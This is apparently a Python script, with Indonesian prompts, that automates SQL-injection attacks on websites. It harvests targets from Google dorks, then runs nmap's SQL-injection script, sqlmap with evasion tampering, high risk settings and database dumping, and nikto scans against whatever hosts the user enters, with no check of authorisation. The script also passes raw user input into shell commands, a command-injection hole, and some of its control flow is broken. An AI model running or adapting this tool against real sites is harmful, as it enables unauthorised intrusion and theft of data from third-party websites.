import os
from googlesearch import search

class main():
    def nmap(self,command):
        requests = os.system(command)
        return requests
    def sqlmap(self,command):
        requests = os.system(command)
        return requests
    def nikto(self,command):
        requests = os.system(command)
        return requests
    def install(self,command):
        requests = os.system(command)
        return requests    
    def testing(self):
        try:
            install_tools = self.install('apt install nmap nikto sqlmap -y')
            print(install_tools)
            print('-----------------------')
            print('|SQL INJECTION TESTER |')
            print('-----------------------')
            print('|Author:sidabutar1337 |')
            print('|github:sidabutar1337 |')
            print('-----------------------')
            query = input('dork: ')
            number = int(input('jumlah target: '))
            for dump in search(query,lang=id,num_results=number):
                print(dump)
                print('berhasil di dump')
            def start1():
                print('--------------tools-------------')
                print('|1.Nmap (Scan Vulnerability)   |')
                print('|2.Sqlmap (Auto Injection Web) |')
                print('|3.Nikto (Scan Vulnerabilty)   |')
                print('--------------------------------')
                menu = int(input('pilih tools: '))
                if menu == 1:
                   print('jangan menggunakan http/https dan juga parameter')
                   print('example = target.com')
                   while True:
                       target = input('input target: ')
                       injection = self.nmap(f'nmap -A -T4 -sV -v -O -p 80,443 {target} --script http-sql-injection.nse')
                       print(injection)
                       if target == 'exit':
                           print('tools berhenti')
                           break
                elif menu == 2:
                   print('sertakan paramter target')
                   print('example = http://target.com/page.php?id=2')
                   while True:
                        target = input('input target: ')
                        injection = self.sqlmap(f'sqlmap -u {target} --tamper=space2comment --level=3 --risk=3 -v 3 --dbs --batch')
                        print(injection)
                        if target == 'exit':
                            print('tools berhenti')
                            break
                elif menu == 3:
                    print('jangan menggunakan parameter')
                    print('example = http://target.com')
                    while True:
                        target = input('input target: ')
                        injection = self.nikto(f'nikto -h {target} -Tuning 9')
                        print(injection)
                        dump_dir = input('ingin dump dir?y/n ')
                        if dump_dir == 'y':
                            injection = self.nikto(f'nikto -h {target} -Cgidirs all')
                            print(injection)
                        else:
                            print('stop')
                            break 
                        if target == 'exit':
                            print('tools berhenti')
                            break
                else:
                    print('pilihan tidak ada')
                    loop = start1()
                    print(loop)
            mulai = start1()
            print(mulai)
        except ConnectionError:
            print('koneksi error')
            print('pastikan koneksi aman dan jalankan ulang tools')
        except ValueError:
            print('gunakan angka untuk inputan jumlah atau pilihan')
            print('jalankan ulang tools')
            loop = start1()
            print(loop)
start = main()
start.testing()